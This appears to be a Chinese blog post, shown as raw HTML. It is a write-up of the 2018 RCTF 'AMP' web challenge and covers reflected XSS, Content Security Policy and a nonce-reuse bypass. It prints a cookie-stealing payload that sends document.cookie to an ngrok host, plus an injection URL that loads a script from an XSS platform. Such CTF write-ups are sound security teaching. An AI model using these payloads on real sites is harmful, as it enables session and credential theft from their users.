<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="chrome=1">

    

    <title>
      它不是 XSS ——记 2018-RCTF一道WEB题：AMP | ——智齿—— 
    </title>

    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
    
      <meta name="author" content="Orange">
    
    

    <meta name="description" content="恰巧这一次的CTF还真没有关注，比赛完了之后，无意间看到了相关的writeup，大致浏览了下，觉得好像还是有点意思的，于是便趁着比赛环境还在，自己玩了玩。 打开题目地址http://amp.2018.teamrois.cn，可以看到以下这个页面，提示输入name作为请求参数。试着输入http://amp.2018.teamrois.cn/?name=123，传入name参数，可以看到以下返回。可以">
<meta name="keywords" content="安全笔记">
<meta property="og:type" content="article">
<meta property="og:title" content="它不是 XSS ——记 2018-RCTF一道WEB题：AMP | ——智齿——">
<meta property="og:url" content="http://yoursite.com/2018/05/29/它不是 XSS ——记 2018-RCTF一道WEB题/index.html">
<meta property="og:site_name" content="——智齿——">
<meta property="og:description" content="恰巧这一次的CTF还真没有关注，比赛完了之后，无意间看到了相关的writeup，大致浏览了下，觉得好像还是有点意思的，于是便趁着比赛环境还在，自己玩了玩。 打开题目地址http://amp.2018.teamrois.cn，可以看到以下这个页面，提示输入name作为请求参数。试着输入http://amp.2018.teamrois.cn/?name=123，传入name参数，可以看到以下返回。可以">
<meta property="og:locale" content="default">
<meta property="og:image" content="http://yoursite.com/2018/05/29/它不是%20XSS%20——记%202018-RCTF一道WEB题/1.png">
<meta property="og:image" content="http://omho4boal.bkt.clouddn.com/2018-05-29-03.png">
<meta property="og:image" content="http://omho4boal.bkt.clouddn.com/2018-05-29-04.png">
<meta property="og:image" content="http://omho4boal.bkt.clouddn.com/2018-05-29-05.png">
<meta property="og:image" content="http://omho4boal.bkt.clouddn.com/2018-05-29-06.png">
<meta property="og:image" content="http://omho4boal.bkt.clouddn.com/2018-05-29-07.png">
<meta property="og:image" content="http://omho4boal.bkt.clouddn.com/2018-05-29-08.jpg">
<meta property="og:image" content="http://omho4boal.bkt.clouddn.com/2018-05-29-09.png">
<meta property="og:updated_time" content="2019-07-29T13:29:05.931Z">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="它不是 XSS ——记 2018-RCTF一道WEB题：AMP | ——智齿——">
<meta name="twitter:description" content="恰巧这一次的CTF还真没有关注，比赛完了之后，无意间看到了相关的writeup，大致浏览了下，觉得好像还是有点意思的，于是便趁着比赛环境还在，自己玩了玩。 打开题目地址http://amp.2018.teamrois.cn，可以看到以下这个页面，提示输入name作为请求参数。试着输入http://amp.2018.teamrois.cn/?name=123，传入name参数，可以看到以下返回。可以">
<meta name="twitter:image" content="http://yoursite.com/2018/05/29/它不是%20XSS%20——记%202018-RCTF一道WEB题/1.png">
    
    
    
      <link rel="icon" type="image/x-icon" href="http://omho4boal.bkt.clouddn.com/favicon.png">
    
    <link rel="stylesheet" href="/css/uno.css">
    <link rel="stylesheet" href="/css/highlight.css">
    <link rel="stylesheet" href="/css/archive.css">
    <link rel="stylesheet" href="/css/china-social-icon.css">

</head>
<body>

    <span class="mobile btn-mobile-menu">
        <i class="icon icon-list btn-mobile-menu__icon"></i>
        <i class="icon icon-x-circle btn-mobile-close__icon hidden"></i>
    </span>

    

<header class="panel-cover panel-cover--collapsed">


  <div class="panel-main">

  
    <div class="panel-main__inner panel-inverted">
    <div class="panel-main__content">

        

        <h1 class="panel-cover__title panel-title"><a href="/" title="link to homepage">——智齿——</a></h1>
        <hr class="panel-cover__divider" />

        

        <div class="navigation-wrapper">

          <nav class="cover-navigation cover-navigation--primary">
            <ul class="navigation">

              
                
                <li class="navigation__item"><a href="/#blog" title="" class="blog-button">首页</a></li>
              
                
                <li class="navigation__item"><a href="/about" title="" class="">关于</a></li>
              
                
                <li class="navigation__item"><a href="/archive" title="" class="">归档</a></li>
              

            </ul>
          </nav>

          <!-- ----------------------------
To add a new social icon simply duplicate one of the list items from below
and change the class in the <i> tag to match the desired social network
and then add your link to the <a>. Here is a full list of social network
classes that you can use:

    icon-social-500px
    icon-social-behance
    icon-social-delicious
    icon-social-designer-news
    icon-social-deviant-art
    icon-social-digg
    icon-social-dribbble
    icon-social-facebook
    icon-social-flickr
    icon-social-forrst
    icon-social-foursquare
    icon-social-github
    icon-social-google-plus
    icon-social-hi5
    icon-social-instagram
    icon-social-lastfm
    icon-social-linkedin
    icon-social-medium
    icon-social-myspace
    icon-social-path
    icon-social-pinterest
    icon-social-rdio
    icon-social-reddit
    icon-social-skype
    icon-social-spotify
    icon-social-stack-overflow
    icon-social-steam
    icon-social-stumbleupon
    icon-social-treehouse
    icon-social-tumblr
    icon-social-twitter
    icon-social-vimeo
    icon-social-xbox
    icon-social-yelp
    icon-social-youtube
    icon-social-zerply
    icon-mail

-------------------------------->

<!-- add social info here -->



        </div>

      </div>

    </div>

    <div class="panel-cover--overlay"></div>
  </div>
</header>

    <div class="content-wrapper">
        <div class="content-wrapper__inner entry">
            

<article class="post-container post-container--single">

  <header class="post-header">
    
    <h1 class="post-title">它不是 XSS ——记 2018-RCTF一道WEB题：AMP</h1>

    

    <div class="post-meta">
      <time datetime="2018-05-29" class="post-meta__date date">2018-05-29</time> 

      <span class="post-meta__tags tags">

          

          
             &#8226; 标签:
            <font class="tags">
              <a class="tags-link" href="/tags/安全笔记/">安全笔记</a>
            </font>
          

      </span>
    </div>
    
    

  </header>

  <section id="post-content" class="article-content post">
    <p>恰巧这一次的CTF还真没有关注，比赛完了之后，无意间看到了相关的writeup，大致浏览了下，觉得好像还是有点意思的，于是便趁着比赛环境还在，自己玩了玩。</p>
<p>打开题目地址<code>http://amp.2018.teamrois.cn</code>，可以看到以下这个页面，提示输入name作为请求参数。<br><img src="1.png" alt="image"><br>试着输入<code>http://amp.2018.teamrois.cn/?name=123</code>，传入name参数，可以看到以下返回。<br><img src="http://omho4boal.bkt.clouddn.com/2018-05-29-03.png" alt="image"><br>可以看到将我们传入的name参数输出到了页面，并且提示说我被攻击，还有一个“STOP TRACKING ME”的按钮，我们点击按钮，先开始一直没有反应，后面发现它使用了谷歌的recaptcha验证码<br><img src="http://omho4boal.bkt.clouddn.com/2018-05-29-04.png" alt="image"><br>我们通过验证之后，得到<br><img src="http://omho4boal.bkt.clouddn.com/2018-05-29-05.png" alt="image"><br>显示已经记录下了我们的request，并且联系了admin。<br>到这一步，就想到了CTF惯用套路。查看网络请求，果然在cookie中找到了提示信息：”flag_is_in_admin_cookie”。<br><img src="http://omho4boal.bkt.clouddn.com/2018-05-29-06.png" alt="image"><br>综合以上信息：name参数会在页面输出；request会记录并发送给admin；flag_is_in_admin_cookie 。想当然的就以为是xss，所以接下来就开始测试name参数，<code>http://amp.2018.teamrois.cn/?name=&lt;script&gt;alert(&#39;xss&#39;)&lt;/script&gt;</code>发现并没有弹窗，打开调试看一下<br><img src="http://omho4boal.bkt.clouddn.com/2018-05-29-07.png" alt="image"><br>可见，其使用了内容安全策略（CSP）。<br><img src="http://omho4boal.bkt.clouddn.com/2018-05-29-08.jpg" alt="image"><br>Content Security Policy（CSP）内容安全策略，是一个附加的安全层，有助于检测并缓解某些类型的攻击，包括跨站脚本（XSS）和数据注入攻击。通过定义一个名为Content-Security-Policy 的header来让浏览器仅载入可信域的资源文件，限制使用内联脚本，禁止页面中使用<code>&lt;script&gt;</code>标签，控制ajax请求域等等。<br>攻击者想要窃取数据，用户浏览器就必须和攻击者的某个地址进行通信，否则攻击者就没有办法接收到最终窃取到的信息结果，而CSP可以用来定义哪些域是被信任的，如果攻击者设定的域不属于被设定的信任域，那么信息就没有办法被偷出去。这样就起到了防御XSS的效果（如果想更深层次的了解CSP，可自行百度）。    </p>
<p>此处的CSP设置了一个<code>script-src</code>值，该属性开启将对当前页面上可执行的JS源进行了限制。<br><img src="http://omho4boal.bkt.clouddn.com/2018-05-29-09.png" alt="image"><br>从页面源代码可以看到，每一个引用的javascript代码（script标签）都有一个nonce字段，其value值是服务器端动态的生成字符串，只有包含nonce字段并且字符串值与服务端相等的script块才可以被执行。从上图中可以看出该实例中，nonce值固定不变。<br>我们下来就尝试绕过。</p>
<p>针对nonce的绕过，我们一般是利用页面上xss可利用点之后较近的js引用中的nonce字段值。举例来说就是：</p>
<p>对于以下代码<br>`</p><p>xss插入点</p><p></p>
<p><script src="http://www.google.com/recaptcha/api.js" nonce="1dda8fc2ac73eaeff4292117028b4562">…</script>`<br>我们可以在xss插入点，输入以下内容：</p>
<pre><code>&lt;script src=&quot;http://xxx.xxx.xxx.xxx/test.js&quot; a=&quot;
</code></pre><p>此时，页面就变为：<br>`</p><p>&lt;script src=”<a href="http://xxx.xxx.xxx.xxx/test.js&quot;" target="_blank" rel="noopener">http://xxx.xxx.xxx.xxx/test.js&quot;</a> a=”</p><p></p>
<p><script src="http://www.google.com/recaptcha/api.js" nonce="1dda8fc2ac73eaeff4292117028b4562">…</script><code>此时，我们可控的xss插入点已经包含了nonce字段值，进而绕过了CSP。
在本题中，我们使用xss平台构造，其中的自定义代码如下：</code>var img = document.createElement(‘img’);<br>img.src = ‘<a href="http://ec492eb4.ngrok.io/flag=&#39;+encodeURIComponent(document.cookie);`" target="_blank" rel="noopener">http://ec492eb4.ngrok.io/flag=&#39;+encodeURIComponent(document.cookie);`</a><br>创建一个img标签，在标签的src中将cookie值作为flag参数值，来访问本地的ngrox。</p>
<p>我们构造的xss利用代码为：<br>    <a href="http://amp.2018.teamrois.cn/?name=" target="_blank" rel="noopener">http://amp.2018.teamrois.cn/?name=</a>&lt;script src=”<a href="https://xsspt.com/Ov7T0a?15283&quot;" target="_blank" rel="noopener">https://xsspt.com/Ov7T0a?15283&quot;</a> a=”<br>访问上述链接，发现并没有自己想的那么简单，获得到的仍然是提示，并不是真正的flag值。</p>
<p>到这里，能想到的思路都试验了。回过头来发现这道题的题目是AMP,所以重新从AMP下手。</p>
<p>了解到：谷歌AMP（Accelerated Mobile Pages，加速移动页面）是Google推出法人一种为静态内容构建 web 页面，提供可靠和快速的渲染，加快页面加载的时间，特别是在移动 Web 端查看内容的时间。也就是说，只要网页遵循我制定的一些规则，你的页面加载速度会更快，据说会有15% ~ 85%的性能提升。<br>AMP HTML 完全是基于现有 web 技术构建的，通过限制一些 HTML，CSS 和 JavaScript 部分来提供可靠的性能。这些限制是通过 AMP HTML 一个验证器强制执行的。为了弥补这些限制，AMP HTML 定义了一系列超出基础 HTML 的自定义元素来丰富内容。</p>
<p>访问AMP官网<code>https://www.ampproject.org/zh_cn/</code></p>

  </section>

  <section class="post-comments">

    <!-- 将评论系统（例如Disqus、多说、友言、畅言等）提供的代码片段粘贴在这里 -->
    
</section>


</article>


            <footer class="footer">

    <span class="footer__copyright">&copy; 2014-2015. | 由<a href="https://hexo.io/">Hexo</a>强力驱动 | 主题<a href="https://github.com/someus/huno">Huno</a></span>
    
</footer>
        </div>
    </div>

    <!-- js files -->
    <script src="/js/jquery.min.js"></script>
    <script src="/js/main.js"></script>
    <script src="/js/scale.fix.js"></script>
    

    

    <script type="text/javascript" src="//cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
    <script type="text/javascript"> 
        $(document).ready(function(){
            MathJax.Hub.Config({ 
                tex2jax: {inlineMath: [['[latex]','[/latex]'], ['\\(','\\)']]} 
            });
        });
    </script>


    

    <script src="/js/awesome-toc.min.js"></script>
    <script>
        $(document).ready(function(){
            $.awesome_toc({
                overlay: true,
                contentId: "post-content",
            });
        });
    </script>


    
    
    <!--kill ie6 -->
<!--[if IE 6]>
  <script src="//letskillie6.googlecode.com/svn/trunk/2/zh_CN.js"></script>
<![endif]-->

</body>
</html>
